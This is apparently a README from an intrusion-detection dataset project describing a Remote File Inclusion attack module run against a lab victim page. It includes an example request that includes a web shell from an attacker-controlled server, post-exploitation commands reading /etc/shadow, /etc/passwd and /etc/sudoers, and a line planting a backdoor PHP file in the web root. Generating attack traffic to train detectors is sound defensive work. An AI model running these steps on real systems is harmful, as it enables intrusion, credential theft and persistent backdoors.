# **Remote File Inclusion**

## **Table of Contents**

* [**Explaining the Attack**](#explaining-the-attack)
* [**How to Use**](#how-to-use)
  * [**Configurations**](#configurations)
  * [**Interactive Mode**](#for-interactive-mode) 
  * [**Repeat Mode**](#for-repeat-mode)

<br/>


## **Explaining the attack**
---

<br/>

A Remote File Inclusion vulnerability is when an application dynamically references external scripts, and those references can be, in some way, manipulated by the attacker.

This attacker will try to use the vulnerability to reference a malware file (e.g. web shells) that will be then included by the application.

In our case we simulated a pretty basic web page with a RFI vulnerability:

![image](https://github.com/LeoPer02/IDS-Dataset/assets/101013606/acc8ea53-4b36-47bb-abee-5d1b4953c8c7)

If you look at the URL you can see that we are grabbing the value of `file`.

![image](https://github.com/LeoPer02/IDS-Dataset/assets/101013606/47180119-a87f-4233-9e67-e68540dbdef0)


Now looking at the code we can see that the php script grabs the value of `file` and includes it.
This of course is a big security problem, since the attacker controls the value of the file variable.

The way we exploit this vulnerability can be summed up in the following steps:

* Generate a web shell that will be uploaded into the web page.
* Open a listener for the the web shell.
* Send a request with a general format of: ```http://victim.com/vulnerable.php?file=http://attacker_controled_server.com/web_shell.php```.
* Receive connection.
  * If in interactive mode allow the user to send arbitrary commands.
  * If in repeat mode execute some commands likely to be used by an attacker ```cat /etc/passwd, cat /etc/shadow, pwd, whoami, uname -a```, etc. and then exit.

![image](https://github.com/LeoPer02/IDS-Dataset/assets/101013606/abca75f5-ed35-4224-b556-d15c9a99c10d)

This is the interface the user will be presented with when executing the attack in interactive mode.

<br/>

## **How to use**
---
<br/>

This exploit can be ran in **interactive** and **repeat** mode.

From the **/path/to/project/IDS-Dataset/Attacks/WP** folder,

<br/>

### **Configurations:**

If you built the victim machine from scratch using our script you can use the following settings for the RFI attack:

``` Shell
sudo python3 main.py -c # To start the configuration process

Attacker ip: # Check the ip address with ' ifconfig '
Victim ip: # Check the ip address with ' ifconfig '
Exploit: 6
HTTPS: n
Victim Port: 80
Resource to access: /file_inclusion.php?file=
Is it correct: y
Activate auditing: y # Make sure the server is on, check Aux README for information
```

<br/>

### **For interactive mode:**
``` Shell
sudo python3 main.py # Don't forget to configure the config.ini on the 1st attack
```

This will print an address in the terminal that when clicked on will redirect you to the web shell with interface.

<br/>

### **For Repeat mode:**
``` Shell
sudo python3 main.py -r {number_times}
```

<br/>

This will utilize the RFI vulnerability to execute a bunch of commands that are likely to be executed by an attacker:
``` Shell
whoami
ls
ls -ltr
cat /etc/shadow
cat /etc/passwd
cd /
id
netstat
uname -a
crontab -l
lsmod
cat /etc/sudoers
cat /etc/os-release
ip link show
cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && echo 'PoC, injected through RFI' | cat > possible_backdoor.php
```

